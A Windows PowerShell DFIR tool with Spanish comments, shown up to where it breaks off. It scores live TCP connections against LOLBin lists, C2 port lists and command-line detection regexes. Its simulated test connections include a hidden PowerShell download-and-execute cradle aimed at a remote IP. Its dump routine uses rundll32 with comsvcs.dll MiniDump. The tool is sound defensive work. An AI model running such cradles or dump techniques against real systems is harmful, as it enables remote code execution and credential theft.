<#
.SYNOPSIS
    SocketSentry: Framework de Deteccion y Analisis Forense de Conexiones de Red en Windows.

.DESCRIPTION
    Herramienta avanzada de Threat Hunting y DFIR (Digital Forensics & Incident Response) para Windows.
    Inspecciona conexiones TCP activas en tiempo real, correlaciona procesos propietarios, analiza rutas
    en disco, extrae e inspecciona lineas de comando completas (CommandLine), verifica firmas digitales
    de codigo (Authenticode), detecta balizas periodicas (Beaconing), evalua contra bases de datos locales
    de puertos de malware y LOLBins, genera volcados de memoria forense (MiniDump) y permite contencion
    activa (bloqueo en Firewall).

.PARAMETER BaseDatosPath
    Ruta al archivo JSON con las reglas de reputacion, puertos, LOLBins y heuristica (db_conexiones.json).

.PARAMETER SoloSospechosas
    Filtra y muestra exclusivamente las conexiones con puntuacion de riesgo sospechoso o critico.

.PARAMETER UmbralAlerta
    Puntaje minimo (0-100) para catalogar una conexion como sospechosa (Por defecto: 35).

.PARAMETER ResolverDNS
    Realiza resolucion DNS inversa rapida no bloqueante para obtener los hostnames remotos.

.PARAMETER IncluirLocales
    Evalua tambien conexiones hacia direcciones privadas / bucle de retorno (127.0.0.1, RFC 1918).

.PARAMETER SimularSospechoso
    Inyecta conexiones de prueba realistas (troyano en Temp, suplantacion de svchost, puerto 4444/50050)
    para verificar visualmente el motor de deteccion y alertas.

.PARAMETER CrearDump
    Preservacion forense: genera automaticamente un volcado de memoria (.dmp) para procesos catalogados
    como CRITICOS o SOSPECHOSOS antes de que terminen o se desconecten.

.PARAMETER BloquearIP
    Respuesta activa: crea una regla en Windows Defender Firewall para bloquear inmediatamente la IP remota
    de conexiones clasificadas como CRITICAS.

.PARAMETER Anonimizar
    Enmascara nombres de host y rutas de usuario locales (reemplazando por WORKSTATION y Usuario)
    en exportaciones HTML y CSV para publicacion o comparticion segura.

.PARAMETER ExportarHTML
    Ruta de destino para generar un dashboard interactivo en formato HTML.

.PARAMETER ExportarCSV
    Ruta de destino para exportar los artefactos forenses en formato CSV estructurado.

.PARAMETER Monitor
    Modo Centinela: ejecuta el escaneo continuo en bucle con deteccion de Beaconing (balizas periodicas).

.PARAMETER IntervaloSegundos
    Intervalo de espera en segundos entre ciclos en modo Monitor (Por defecto: 10).

.EXAMPLE
    .\Auditar-Conexiones.ps1 -ResolverDNS

.EXAMPLE
    .\Auditar-Conexiones.ps1 -SoloSospechosas -CrearDump

.EXAMPLE
    .\Auditar-Conexiones.ps1 -Monitor -IntervaloSegundos 5 -BloquearIP
#>

[CmdletBinding()]
param(
    [string]$BaseDatosPath = "",
    [switch]$SoloSospechosas,
    [int]$UmbralAlerta = 35,
    [switch]$ResolverDNS,
    [switch]$IncluirLocales,
    [switch]$SimularSospechoso,
    [switch]$CrearDump,
    [switch]$BloquearIP,
    [switch]$Anonimizar,
    [switch]$ActualizarFeeds,
    [string]$ExportarHTML = "",
    [string]$ExportarCSV = "",
    [switch]$Monitor,
    [int]$IntervaloSegundos = 10
)

# Configuracion global de ejecucion
$ErrorActionPreference = 'SilentlyContinue'

# Historial en memoria para deteccion de Balizas (Beaconing) y cache de firmas
$script:BeaconingHistory = @{}
$script:BinaryPathCache  = @{}

# Comprobacion de privilegios de Administrador
function Test-IsAdmin {
    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    return $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

# Carga de la Base de Datos Local de Reputacion y Reglas
function Get-ThreatDatabase {
    param([string]$Path)

    if (Test-Path $Path) {
        try {
            $jsonContent = Get-Content -Path $Path -Raw -Encoding UTF8
            return ($jsonContent | ConvertFrom-Json)
        }
        catch {
            Write-Warning "No se pudo leer la base de datos en '$Path'. Se utilizara configuracion predeterminada."
        }
    }

    # Configuracion de contingencia embebida
    return [PSCustomObject]@{
        Version = "1.3"
        UltimaActualizacionFeeds = "Nunca"
        IOC_C2_IPs = @{}
        RutasSospechosas = @(
            [PSCustomObject]@{ Patron = "\\AppData\\Local\\Temp"; Puntos = 40; Motivo = "Ejecutable corriendo desde carpeta temporal de usuario (%TEMP%)" },
            [PSCustomObject]@{ Patron = "\\Windows\\Temp"; Puntos = 40; Motivo = "Ejecutable corriendo desde carpeta temporal del sistema (C:\Windows\Temp)" },
            [PSCustomObject]@{ Patron = "\\Users\\Public"; Puntos = 35; Motivo = "Ejecutable ubicado en C:\Users\Public (directorio comun de staging)" },
            [PSCustomObject]@{ Patron = "\\PerfLogs"; Puntos = 40; Motivo = "Ejecutable en C:\PerfLogs (tecnica de evasion)" },
            [PSCustomObject]@{ Patron = "\\AppData\\Roaming"; Puntos = 25; Motivo = "Ejecutable en AppData Roaming" },
            [PSCustomObject]@{ Patron = "C:\\[^\\]+\.exe$"; Puntos = 30; Motivo = "Ejecutable corriendo directamente en la raiz C:\" }
        )
        ArgumentosSospechosos = @(
            [PSCustomObject]@{ Patron = "(?i)-(enc|encodedcommand)\b"; Puntos = 35; Motivo = "Comando codificado en Base64 (-EncodedCommand)" },
            [PSCustomObject]@{ Patron = "(?i)-(w|windowstyle)\s+hidden"; Puntos = 25; Motivo = "Ejecucion oculta en segundo plano (-WindowStyle Hidden)" },
            [PSCustomObject]@{ Patron = "(?i)(downloadstring|downloaddata|downloadfile|iwr\s|curl\s|invoke-webrequest)"; Puntos = 35; Motivo = "Cradle de descarga en memoria o remota activa" },
            [PSCustomObject]@{ Patron = "(?i)-(ep|executionpolicy)\s+bypass"; Puntos = 20; Motivo = "Evasion de politica de ejecucion (-ExecutionPolicy Bypass)" },
            [PSCustomObject]@{ Patron = "(?i)iex\s*\("; Puntos = 35; Motivo = "Invocacion dinamica de expresiones en memoria (IEX)" }
        )
        LOLBins = @(
            [PSCustomObject]@{ Nombre = "powershell.exe"; Puntos = 35; Motivo = "PowerShell con conexion de red externa activa" },
            [PSCustomObject]@{ Nombre = "pwsh.exe"; Puntos = 30; Motivo = "PowerShell Core con conexion externa activa" },
            [PSCustomObject]@{ Nombre = "cmd.exe"; Puntos = 40; Motivo = "Simbolo del sistema con conexion de red directa" },
            [PSCustomObject]@{ Nombre = "mshta.exe"; Puntos = 45; Motivo = "MSHTA con conexion saliente (posible ataque HTA/C2)" },
            [PSCustomObject]@{ Nombre = "certutil.exe"; Puntos = 45; Motivo = "CertUtil conectado a la red (posible descarga/exfiltracion)" },
            [PSCustomObject]@{ Nombre = "rundll32.exe"; Puntos = 35; Motivo = "Rundll32 comunicandose por red externa" },
            [PSCustomObject]@{ Nombre = "regsvr32.exe"; Puntos = 40; Motivo = "Regsvr32 comunicandose por red externa" },
            [PSCustomObject]@{ Nombre = "cscript.exe"; Puntos = 35; Motivo = "Host de scripts VBS/JS con conexion saliente" },
            [PSCustomObject]@{ Nombre = "wscript.exe"; Puntos = 35; Motivo = "Host de scripts VBS/JS con conexion saliente" },
            [PSCustomObject]@{ Nombre = "bitsadmin.exe"; Puntos = 30; Motivo = "BITSAdmin con actividad de red saliente" }
        )
        PuertosSospechosos = @(
            [PSCustomObject]@{ Puerto = 4444; Puntos = 50; Amenaza = "Metasploit / Meterpreter Default Payload" },
            [PSCustomObject]@{ Puerto = 1337; Puntos = 45; Amenaza = "Puerto clasico de RATs y Backdoors (Elite)" },
            [PSCustomObject]@{ Puerto = 31337; Puntos = 45; Amenaza = "BackOrifice / RAT default" },
            [PSCustomObject]@{ Puerto = 50050; Puntos = 50; Amenaza = "Cobalt Strike Team Server default port" },
            [PSCustomObject]@{ Puerto = 8888; Puntos = 20; Amenaza = "Puerto comun de proxies HTTP alternativos y C2" },
            [PSCustomObject]@{ Puerto = 6667; Puntos = 35; Amenaza = "IRC / Botnet C2" },
            [PSCustomObject]@{ Puerto = 5555; Puntos = 30; Amenaza = "ADB / Troyanos bancarios y miners" },
            [PSCustomObject]@{ Puerto = 4443; Puntos = 25; Amenaza = "SSL alternativo comun en C2s como Sliver / Mythic" }
        )
        FirmantesConfiables = @(
            [PSCustomObject]@{ Nombre = "Microsoft Corporation"; RutasPermitidas = @("C:\Windows\", "C:\Program Files") },
            [PSCustomObject]@{ Nombre = "Microsoft Windows"; RutasPermitidas = @("C:\Windows\") },
            [PSCustomObject]@{ Nombre = "Google LLC"; RutasPermitidas = @("C:\Program Files\Google") },
            [PSCustomObject]@{ Nombre = "Mozilla Corporation"; RutasPermitidas = @("C:\Program Files\Mozilla Firefox") }
        )
        ListaBlancaProcesos = @(
            [PSCustomObject]@{ Proceso = "System"; RutaEsperada = ""; RequiereFirma = $false },
            [PSCustomObject]@{ Proceso = "svchost.exe"; RutaEsperada = "C:\Windows\System32\svchost.exe"; RequiereFirma = $true },
            [PSCustomObject]@{ Proceso = "spoolsv.exe"; RutaEsperada = "C:\Windows\System32\spoolsv.exe"; RequiereFirma = $true },
            [PSCustomObject]@{ Proceso = "explorer.exe"; RutaEsperada = "C:\Windows\explorer.exe"; RequiereFirma = $true }
        )
    }
}

# Comprobacion de IP privada / local vs publica
function Test-IsPrivateIP {
    param([string]$IPString)
    
    if ([string]::IsNullOrWhiteSpace($IPString)) { return $true }
    if ($IPString -in @("0.0.0.0", "127.0.0.1", "::1", "::", "localhost")) { return $true }

    [System.Net.IPAddress]$ip = $null
    if ([System.Net.IPAddress]::TryParse($IPString, [ref]$ip)) {
        if ($ip.AddressFamily -eq [System.Net.Sockets.AddressFamily]::InterNetworkV6) {
            return ($ip.IsIPv6LinkLocal -or $ip.IsIPv6SiteLocal -or $ip.ToString().ToLower().StartsWith("fe80"))
        }

        $bytes = $ip.GetAddressBytes()
        # 10.0.0.0/8
        if ($bytes[0] -eq 10) { return $true }
        # 172.16.0.0/12
        if ($bytes[0] -eq 172 -and ($bytes[1] -ge 16 -and $bytes[1] -le 31)) { return $true }
        # 192.168.0.0/16
        if ($bytes[0] -eq 192 -and $bytes[1] -eq 168) { return $true }
        # 169.254.0.0/16 (APIPA)
        if ($bytes[0] -eq 169 -and $bytes[1] -eq 254) { return $true }
        # 127.0.0.0/8
        if ($bytes[0] -eq 127) { return $true }
    }
    return $false
}

# Resolucion DNS inversa rapida
function Get-QuickReverseDNS {
    param([string]$IPString)
    if (Test-IsPrivateIP $IPString) { return "Local / Red Privada" }
    try {
        $task = [System.Net.Dns]::GetHostEntryAsync($IPString)
        if ($task.Wait(400)) {
            return $task.Result.HostName
        }
    }
    catch {}
    return "Sin resolver / Desconocido"
}

# Cache de procesos enriquecidos
$script:ProcessCache = @{}

function Get-EnrichedProcessInfo {
    param([int]$TargetPID)

    if ($script:ProcessCache.ContainsKey($TargetPID)) {
        return $script:ProcessCache[$TargetPID]
    }

    $info = [PSCustomObject]@{
        PID           = $TargetPID
        Nombre        = "Desconocido"
        Ruta          = ""
        CommandLine   = ""
        FirmaValida   = $false
        Firmante      = "Sin Firma"
        HashSHA256    = ""
        Usuario       = ""
        EsValido      = $false
    }

    if ($TargetPID -eq 0) {
        $info.Nombre = "Idle (Sistema)"
        $info.Firmante = "Kernel"
        $script:ProcessCache[$TargetPID] = $info
        return $info
    }
    if ($TargetPID -eq 4) {
        $info.Nombre = "System"
        $info.Firmante = "Kernel NT de Windows"
        $info.FirmaValida = $true
        $script:ProcessCache[$TargetPID] = $info
        return $info
    }

    # 1. Obtener datos basicos con Get-Process
    $proc = Get-Process -Id $TargetPID -ErrorAction SilentlyContinue
    if ($proc) {
        $info.Nombre = $proc.ProcessName
        try {
            $info.Ruta = $proc.Path
        } catch {}
    }

    # 2. Consultar WMI/CIM para CommandLine, ruta y usuario desde cache masiva
    if ($script:AllCimProcesses.ContainsKey($TargetPID)) {
        $wmiProc = $script:AllCimProcesses[$TargetPID]
        if ([string]::IsNullOrWhiteSpace($info.Nombre) -or $info.Nombre -eq "Desconocido") { 
            $info.Nombre = $wmiProc.Name.Replace(".exe", "") 
        }
        if ([string]::IsNullOrWhiteSpace($info.Ruta)) {
            $info.Ruta = $wmiProc.ExecutablePath
        }
        $info.CommandLine = $wmiProc.CommandLine
    }

    # 3. Analisis del binario en disco con cache de firmas y hash por ruta
    if (![string]::IsNullOrWhiteSpace($info.Ruta) -and (Test-Path $info.Ruta)) {
        $info.EsValido = $true

        if ($script:BinaryPathCache.ContainsKey($info.Ruta)) {
            $cached = $script:BinaryPathCache[$info.Ruta]
            $info.FirmaValida = $cached.FirmaValida
            $info.Firmante    = $cached.Firmante
            $info.HashSHA256  = $cached.HashSHA256
        } else {
            # A. Comprobacion de Firma Digital (Authenticode)
            try {
                $sig = Get-AuthenticodeSignature -FilePath $info.Ruta -ErrorAction SilentlyContinue
                if ($sig) {
                    if ($sig.Status -eq [System.Management.Automation.SignatureStatus]::Valid) {
                        $info.FirmaValida = $true
                        $subject = $sig.SignerCertificate.Subject
                        if ($subject -match 'CN=([^,]+)') {
                            $info.Firmante = $matches[1]
                        } else {
                            $info.Firmante = $sig.SignerCertificate.Subject
                        }
                    } else {
                        $info.FirmaValida = $false
                        $info.Firmante = "Invalida ($($sig.Status))"
                    }
                }
            } catch {
                $info.Firmante = "Error de verificacion"
            }

            # B. Hash SHA256 para correlacion Forense
            try {
                $hashObj = Get-FileHash -Path $info.Ruta -Algorithm SHA256 -ErrorAction SilentlyContinue
                if ($hashObj) {
                    $info.HashSHA256 = $hashObj.Hash
                }
            } catch {}

            $script:BinaryPathCache[$info.Ruta] = @{
                FirmaValida = $info.FirmaValida
                Firmante    = $info.Firmante
                HashSHA256  = $info.HashSHA256
            }
        }
    }

    $script:ProcessCache[$TargetPID] = $info
    return $info
}

# Preservacion Forense: MiniDump de Memoria de Proceso
function New-ProcessMiniDump {
    param(
        [int]$TargetPID,
        [string]$ProcessName,
        [string]$DumpFolder = "$PSScriptRoot\Dumps"
    )

    if ($TargetPID -le 4) { return $null }
    
    if (!(Test-Path $DumpFolder)) {
        New-Item -ItemType Directory -Path $DumpFolder -Force | Out-Null
    }

    $timestamp = (Get-Date).ToString("yyyyMMdd_HHmmss")
    $dumpFile = Join-Path $DumpFolder "Dump_${ProcessName}_${TargetPID}_${timestamp}.dmp"

    try {
        # Ejecuta MiniDump mediante el manejador nativo comsvcs.dll de Windows
        $arg = "C:\Windows\System32\comsvcs.dll, MiniDump $TargetPID `"$dumpFile`" full"
        $p = Start-Process -FilePath "rundll32.exe" -ArgumentList $arg -Wait -PassThru -WindowStyle Hidden
        
        if (Test-Path $dumpFile) {
            Write-Host "   [+] VOLCADO FORENSE EXITOSO: Archivo preservado en '$dumpFile'" -ForegroundColor Green
            return $dumpFile
        }
    } catch {}

    Write-Host "   [-] No se pudo generar volcado para PID $TargetPID (Requiere permisos elevados de Administrador)" -ForegroundColor Gray
    return $null
}

# Respuesta Activa: Bloqueo en Windows Defender Firewall
function Block-SuspiciousIP {
    param([string]$IPAddress)

    if (Test-IsPrivateIP $IPAddress) { return }

    $ruleName = "SocketSentry_Block_${IPAddress}"
    try {
        # Verificar si la regla ya existe
        $existing = Get-NetFirewallRule -Name $ruleName -ErrorAction SilentlyContinue
        if (!$existing) {
            New-NetFirewallRule -DisplayName "SocketSentry Bloqueo de Amenaza $IPAddress" `
                -Name $ruleName `
                -Direction Outbound `
                -Action Block `
                -RemoteAddress $IPAddress `
                -Description "Regla automatica creada por SocketSentry ante conexion C2/Sospechosa" `
                -ErrorAction SilentlyContinue | Out-Null
            Write-Host "   [+] CONTENCION ACTIVA: Regla de Firewall creada. IP $IPAddress bloqueada." -ForegroundColor Green
        }
    } catch {
        Write-Host "   [-] No se pudo crear regla de Firewall (Requiere Administrador)." -ForegroundColor Gray
    }
}

# Sincronizacion de Feeds de Inteligencia de Amenazas (Abuse.ch Feodo Tracker y LOLBAS)
function Update-ThreatFeeds {
    param(
        [string]$DbPath,
        $Database
    )

    Write-Host "`n======================================================================" -ForegroundColor Cyan
    Write-Host "      ACTUALIZANDO FEEDS DE THREAT INTELLIGENCE Y REPUTACION          " -ForegroundColor Yellow -BackgroundColor Black
    Write-Host "======================================================================" -ForegroundColor Cyan

    $actualizado = $false

    # 1. Feed de Servidores C2 Activos en Vivo (Abuse.ch Feodo Tracker)
    Write-Host " [*] Conectando con Abuse.ch Feodo Tracker (IP Blocklist de C2s)..." -ForegroundColor Cyan
    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13
        $feodoUrl = "https://feodotracker.abuse.ch/downloads/ipblocklist.json"
        $c2Data = Invoke-RestMethod -Uri $feodoUrl -TimeoutSec 15 -ErrorAction Stop

        if ($c2Data -and $c2Data.Count -gt 0) {
            $c2Map = @{}
            foreach ($item in $c2Data) {
                if ($item.ip_address) {
                    $c2Map[$item.ip_address] = [PSCustomObject]@{
                        Malware = if ($item.malware) { $item.malware } else { "Botnet / C2" }
                        Puerto  = $item.port
                        ASName  = $item.as_name
                        Estado  = $item.status
                    }
                }
            }
            $Database | Add-Member -NotePropertyName "IOC_C2_IPs" -NotePropertyValue $c2Map -Force
            Write-Host " [OK] Feodo Tracker: $($c2Map.Count) servidores C2 activos cargados exitosamente." -ForegroundColor Green
            $actualizado = $true
        }
    }
    catch {
        Write-Host " [!] No se pudo conectar con Abuse.ch Feodo Tracker: $($_.Exception.Message)" -ForegroundColor Yellow
    }

    # 2. Feed de Binarios Oficiales del Proyecto LOLBAS
    Write-Host " [*] Consultando catalogo oficial del Proyecto LOLBAS (Living Off The Land)..." -ForegroundColor Cyan
    try {
        $lolbasUrl = "https://lolbas-project.github.io/api/lolbas.json"
        $lolbasData = Invoke-RestMethod -Uri $lolbasUrl -TimeoutSec 15 -ErrorAction Stop

        if ($lolbasData -and $lolbasData.Count -gt 0) {
            $lolbasList = [System.Collections.Generic.List[PSObject]]::new()
            $existentes = @($Database.LOLBins | ForEach-Object { $_.Nombre.ToLower() })

            foreach ($bin in $Database.LOLBins) {
                $lolbasList.Add($bin)
            }

            $nuevos = 0
            foreach ($entry in $lolbasData) {
                $nombreL = $entry.Name.ToLower()
                if ($nombreL -notin $existentes) {
                    $lolbasList.Add([PSCustomObject]@{
                        Nombre = $entry.Name
                        Puntos = 25
                        Motivo = "Binario documentado en Proyecto LOLBAS ($($entry.Description))"
                    })
                    $nuevos++
                }
            }

            $Database | Add-Member -NotePropertyName "LOLBins" -NotePropertyValue $lolbasList -Force
            Write-Host " [OK] LOLBAS Project: $($lolbasData.Count) binarios verificados ($nuevos adicionales incorporados)." -ForegroundColor Green
            $actualizado = $true
        }
    }
    catch {
        Write-Host " [!] No se pudo conectar con LOLBAS Project: $($_.Exception.Message)" -ForegroundColor Yellow
    }

    if ($actualizado) {
        $fechaActualizacion = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
        $Database | Add-Member -NotePropertyName "UltimaActualizacionFeeds" -NotePropertyValue $fechaActualizacion -Force
        try {
            $Database | ConvertTo-Json -Depth 6 | Out-File -FilePath $DbPath -Encoding UTF8
            Write-Host " [OK] Base de datos local actualizada y persistida en: $DbPath" -ForegroundColor Green
        } catch {
            Write-Host " [!] No se pudo guardar la base de datos en disco: $($_.Exception.Message)" -ForegroundColor Yellow
        }
    }
    Write-Host "======================================================================`n" -ForegroundColor Cyan
}

# Motor de Evaluacion de Riesgos y Correlacion Heuristica
function Invoke-ConnectionRiskAssessment {
    param(
        $Connection,
        $ProcessInfo,
        $Database,
        [switch]$ResolveNames
    )

    $score = 0
    $motivos = [System.Collections.Generic.List[string]]::new()
    $esPrivada = Test-IsPrivateIP -IPString $Connection.RemoteAddress

    if ($esPrivada) {
        $tipoConexion = "Privada / Intranet"
    } else {
        $tipoConexion = "Internet / Publica"
        $score += 5
    }

    # 0. Correlacion contra IOCs de C2 Activos en Vivo (Abuse.ch Feodo Tracker)
    if ($Database.IOC_C2_IPs) {
        $c2Hit = $null
        if ($Database.IOC_C2_IPs -is [System.Collections.IDictionary] -and $Database.IOC_C2_IPs.Contains($Connection.RemoteAddress)) {
            $c2Hit = $Database.IOC_C2_IPs[$Connection.RemoteAddress]
        } elseif ($Database.IOC_C2_IPs.PSObject.Properties[$Connection.RemoteAddress]) {
            $c2Hit = $Database.IOC_C2_IPs.PSObject.Properties[$Connection.RemoteAddress].Value
        }

        if ($c2Hit) {
            $score += 75
            $motivos.Add("[IOC C2 Confirmado - Feodo Tracker] IP catalogada como C2 activo de '$($c2Hit.Malware)' (Puerto C2: $($c2Hit.Puerto), AS: $($c2Hit.ASName))")
        }
    }

    # 1. Proceso sin ruta ejecutable accesible
    if ([string]::IsNullOrWhiteSpace($ProcessInfo.Ruta) -and $ProcessInfo.PID -gt 4) {
        if (!$esPrivada) {
            $score += 25
            $motivos.Add("[Proceso No Mapeado] Sin ruta en disco identificable comunicandose a Internet")
        }
    }

    # 2. Analisis contra Reglas de Rutas Sospechosas de la Base de Datos
    if (![string]::IsNullOrWhiteSpace($ProcessInfo.Ruta)) {
        foreach ($regla in $Database.RutasSospechosas) {
            if ($ProcessInfo.Ruta -match $regla.Patron) {
                $score += [int]$regla.Puntos
                $motivos.Add("[Alerta Ubicacion] " + $regla.Motivo)
                break
            }
        }
    }

    # 3. Analisis de Linea de Comandos (CommandLine Heuristics)
    if (![string]::IsNullOrWhiteSpace($ProcessInfo.CommandLine)) {
        foreach ($argRule in $Database.ArgumentosSospechosos) {
            if ($ProcessInfo.CommandLine -match $argRule.Patron) {
                $score += [int]$argRule.Puntos
                $motivos.Add("[Argumento Sospechoso] " + $argRule.Motivo)
            }
        }
    }

    # 4. Comprobacion de Binarios LOLBins
    $nombreExe = if ($ProcessInfo.Nombre.ToLower().EndsWith(".exe")) {
        $ProcessInfo.Nombre.ToLower()
    } else {
        $ProcessInfo.Nombre.ToLower() + ".exe"
    }

    foreach ($lol in $Database.LOLBins) {
        if ($lol.Nombre.ToLower() -eq $nombreExe) {
            if (!$esPrivada) {
                $score += [int]$lol.Puntos
                $motivos.Add("[LOLBin Saliente] " + $lol.Motivo)
            } else {
                $score += [Math]::Floor([int]$lol.Puntos / 3)
                $motivos.Add("[LOLBin Local] Proceso estandar con conexion en red interna")
            }
            break
        }
    }

    # 5. Deteccion de Suplantacion de Identidad (Masquerading)
    foreach ($blanca in $Database.ListaBlancaProcesos) {
        if ($nombreExe -eq $blanca.Proceso.ToLower()) {
            if (![string]::IsNullOrWhiteSpace($blanca.RutaEsperada)) {
                if ($ProcessInfo.Ruta -and ($ProcessInfo.Ruta.ToLower() -ne $blanca.RutaEsperada.ToLower())) {
                    $score += 55
                    $motivos.Add("[SUPLANTACION CRITICA] Proceso legitimo aparente '" + $nombreExe + "' ejecutandose desde ruta no autorizada: " + $ProcessInfo.Ruta)
                }
            }
        }
    }

    # 6. Comprobacion de Puertos de Malware / C2 en la Base de Datos
    foreach ($pto in $Database.PuertosSospechosos) {
        if ($Connection.RemotePort -eq [int]$pto.Puerto) {
            $score += [int]$pto.Puntos
            $motivos.Add("[Puerto C2/Malware] Conexion al puerto " + $pto.Puerto + " (" + $pto.Amenaza + ")")
            break
        }
    }

    # 7. Deteccion de Balizas Periodicas (Beaconing)
    $beaconKey = "$($ProcessInfo.Nombre)_$($Connection.RemoteAddress):$($Connection.RemotePort)"
    $ahora = Get-Date
    if (!$script:BeaconingHistory.ContainsKey($beaconKey)) {
        $script:BeaconingHistory[$beaconKey] = [System.Collections.Generic.List[datetime]]::new()
    }
    $historial = $script:BeaconingHistory[$beaconKey]
    $historial.Add($ahora)

    # Si se han registrado al menos 3 eventos en el monitor, evaluar cadencia
    if ($historial.Count -ge 3 -and !$esPrivada) {
        $deltas = for ($i = 1; $i -lt $historial.Count; $i++) {
            ($historial[$i] - $historial[$i-1]).TotalSeconds
        }
        $promedioDelta = ($deltas | Measure-Object -Average).Average
        if ($promedioDelta -ge 3 -and $promedioDelta -le 120) {
            $score += 30
            $motivos.Add("[Beaconing C2 Detectado] Conexiones periodicas recurrentes cada ~" + [Math]::Round($promedioDelta, 1) + "s")
        }
    }

    # 8. Evaluacion de Firma Digital (Authenticode)
    if ($ProcessInfo.PID -gt 4 -and ![string]::IsNullOrWhiteSpace($ProcessInfo.Ruta)) {
        if (!$ProcessInfo.FirmaValida) {
            if (!$esPrivada) {
                $score += 30
                $motivos.Add("[Sin Firma Digital] Binario sin firma Authenticode valida comunicandose a Internet")
            } else {
                $score += 10
                $motivos.Add("[Sin Firma Digital] Proceso sin firma en red local")
            }
        } else {
            $firmanteConfiable = $false
            foreach ($conf in $Database.FirmantesConfiables) {
                if ($ProcessInfo.Firmante -like "*$($conf.Nombre)*") {
                    $firmanteConfiable = $true
                    break
                }
            }

            if ($firmanteConfiable) {
                $score = [Math]::Max(0, $score - 30)
            } else {
                $score = [Math]::Max(0, $score - 10)
            }
        }
    }

    # Resolucion Hostname DNS
    $hostname = "Omitido (Use -ResolverDNS)"
    if ($ResolveNames) {
        $hostname = Get-QuickReverseDNS -IPString $Connection.RemoteAddress
    }

    # Nivel de Clasificacion
    $nivel = "CONFIABLE"
    $color = "Green"
    if ($score -ge 65) {
        $nivel = "CRITICO"
        $color = "Red"
    } elseif ($score -ge 35) {
        $nivel = "SOSPECHOSO"
        $color = "Yellow"
    } elseif ($score -ge 15) {
        $nivel = "INFORMATIVO"
        $color = "Cyan"
    }

    if ($motivos.Count -eq 0) {
        $motivos.Add("Proceso firmado o con comportamiento estandar")
    }

    $motivosTexto = ($motivos -join " | ")

    return [PSCustomObject]@{
        FechaHora       = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
        PID             = $ProcessInfo.PID
        Proceso         = $ProcessInfo.Nombre
        Ruta            = if ($ProcessInfo.Ruta) { $ProcessInfo.Ruta } else { "[Ruta no accesible]" }
        CommandLine     = $ProcessInfo.CommandLine
        Firmante        = $ProcessInfo.Firmante
        FirmaValida     = $ProcessInfo.FirmaValida
        IPLocal         = $Connection.LocalAddress
        PuertoLocal     = $Connection.LocalPort
        IPRemota        = $Connection.RemoteAddress
        PuertoRemoto    = $Connection.RemotePort
        Estado          = $Connection.State
        TipoIP          = $tipoConexion
        HostnameRemoto  = $hostname
        ScoreRiesgo     = [Math]::Min(100, $score)
        NivelRiesgo     = $nivel
        ColorAlerta     = $color
        Motivos         = $motivosTexto
        HashSHA256      = $ProcessInfo.HashSHA256
    }
}

# Conexiones simuladas para demostracion tecnica
function Get-SimulatedConnections {
    return @(
        [PSCustomObject]@{
            LocalAddress  = "192.168.1.100"
            LocalPort     = 49832
            RemoteAddress = "185.220.101.5"
            RemotePort    = 4444
            State         = "Established"
            OwningProcess = 9991
            Simulado      = $true
            SimInfo       = [PSCustomObject]@{
                PID         = 9991
                Nombre      = "update_svc"
                Ruta        = "C:\Users\Usuario\AppData\Local\Temp\update_svc.exe"
                CommandLine = "C:\Users\Usuario\AppData\Local\Temp\update_svc.exe -w hidden -enc JABjAGwAaQBlAG4AdAA...="
                FirmaValida = $false
                Firmante    = "Sin Firma"
                HashSHA256  = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
                Usuario     = "WORKGROUP\Usuario"
                EsValido    = $true
            }
        },
        [PSCustomObject]@{
            LocalAddress  = "192.168.1.100"
            LocalPort     = 51234
            RemoteAddress = "91.108.240.12"
            RemotePort    = 50050
            State         = "Established"
            OwningProcess = 9992
            Simulado      = $true
            SimInfo       = [PSCustomObject]@{
                PID         = 9992
                Nombre      = "svchost"
                Ruta        = "C:\Users\Public\svchost.exe"
                CommandLine = "C:\Users\Public\svchost.exe -k netsvcs"
                FirmaValida = $false
                Firmante    = "No Confiable"
                HashSHA256  = "4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a"
                Usuario     = "NT AUTHORITY\SYSTEM"
                EsValido    = $true
            }
        },
        [PSCustomObject]@{
            LocalAddress  = "192.168.1.100"
            LocalPort     = 52410
            RemoteAddress = "194.26.29.111"
            RemotePort    = 8080
            State         = "Established"
            OwningProcess = 9993
            Simulado      = $true
            SimInfo       = [PSCustomObject]@{
                PID         = 9993
                Nombre      = "powershell"
                Ruta        = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
                CommandLine = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('http://194.26.29.111:8080/stage.ps1')"
                FirmaValida = $true
                Firmante    = "Microsoft Windows"
                HashSHA256  = "8a32d6f6e520f92b76a6d655f458872f23fb421718ec25f9b9dc49b7dfd2cb89"
                Usuario     = "WORKGROUP\Usuario"
                EsValido    = $true
            }
        }
    )
}

# Ciclo principal de auditoria
function Invoke-AuditCycle {
    param(
        $Database,
        [switch]$ShowOnlySuspicious,
        [int]$Threshold,
        [switch]$ResolveDNS,
        [switch]$IncludeLocals,
        [switch]$Simulate
    )

    $script:ProcessCache.Clear()
    $script:AllCimProcesses = @{}
    try {
        Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | ForEach-Object {
            $script:AllCimProcesses[[int]$_.ProcessId] = $_
        }
    } catch {}

    $rawConnections = [System.Collections.Generic.List[PSObject]]::new()
    
    $realConnections = Get-NetTCPConnection -State Established, CloseWait, SynSent -ErrorAction SilentlyContinue
    if ($realConnections) {
        foreach ($c in $realConnections) { $rawConnections.Add($c) }
    }

    if ($Simulate) {
        $simConns = Get-SimulatedConnections
        foreach ($sc in $simConns) { $rawConnections.Add($sc) }
    }

    if ($rawConnections.Count -eq 0) {
        Write-Host " No se encontraron conexiones TCP activas en los estados monitoreados." -ForegroundColor Gray
        return @()
    }

    $results = [System.Collections.Generic.List[PSObject]]::new()

    foreach ($conn in $rawConnections) {
        $isPriv = Test-IsPrivateIP -IPString $conn.RemoteAddress
        if ($isPriv -and !$IncludeLocals) {
            if ($conn.RemoteAddress -in @("127.0.0.1", "::1", "0.0.0.0")) {
                continue
            }
        }

        if ($conn.Simulado) {
            $procInfo = $conn.SimInfo
        } else {
